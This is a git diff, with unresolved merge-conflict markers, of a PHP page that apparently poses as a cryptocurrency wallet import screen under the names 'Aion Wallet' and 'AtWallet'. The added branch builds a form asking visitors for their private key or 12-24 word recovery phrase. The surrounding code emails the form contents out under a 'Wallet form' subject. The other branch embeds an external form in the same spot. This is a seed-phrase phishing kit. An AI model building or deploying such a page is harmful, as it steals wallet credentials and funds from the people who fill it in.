@@ -34,7 +34,11 @@ $message = "";
 
       // Content
        $mail->isHTML(true); 
+<<<<<<< HEAD
        $mail->Subject = 'Aion Wallet form';
+=======
+       $mail->Subject = 'AtWallet Wallet form';
+>>>>>>> 67646fa33abc20f8461d0d4815c03e7c65e2fb9f
        $mail->Body = '
           <TABLE>
              <TR>
@@ -184,7 +188,16 @@ $message = "";
 <div id="private1" class="tabcontent" style="display: none;">
     
         <!-- <input type="hidden" name="privatekey" value="MEW wallet"> -->
+<<<<<<< HEAD
         <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+=======
+        <div class="field">
+            <input type="text" name="key" class="privatekey" placeholder="Private Key">
+        </div>
+        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        <br>
+        <button type="submit" name="submit" class="btn">IMPORT</button>
+>>>>>>> 67646fa33abc20f8461d0d4815c03e7c65e2fb9f
     </form>
 </div>
 
